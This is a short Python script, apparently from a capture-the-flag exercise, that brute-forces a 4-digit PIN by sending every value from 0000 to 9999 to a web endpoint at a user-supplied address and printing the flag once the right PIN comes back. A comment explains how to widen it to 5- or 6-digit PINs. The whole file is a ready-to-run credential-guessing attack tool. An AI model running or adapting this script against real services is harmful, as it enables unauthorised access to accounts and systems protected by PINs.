# pip install tqdm

import requests
from tqdm import tqdm

total_range = 10000

print(f"Brute forcing {len(str(total_range-1))} digit pin")
ip = input("Enter ip or url without http(s):// and without end '/': ")
port = input("Enter port number: ")       

# Try every possible 4-digit PIN (from 0000 to 9999)
for pin in tqdm(range(total_range), desc="Progress", unit="PIN", ncols=100):
    formatted_pin = f"{pin:04d}"  
    # Convert the number to a 4-digit string (e.g., 7 becomes "0007").
    # change max width from 4 digit pin to any (5, 6) and increase the range.

    # Send the request to the server
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    if response.ok and 'flag' in response.json():
        print(f"\nCorrect PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        exit(0)
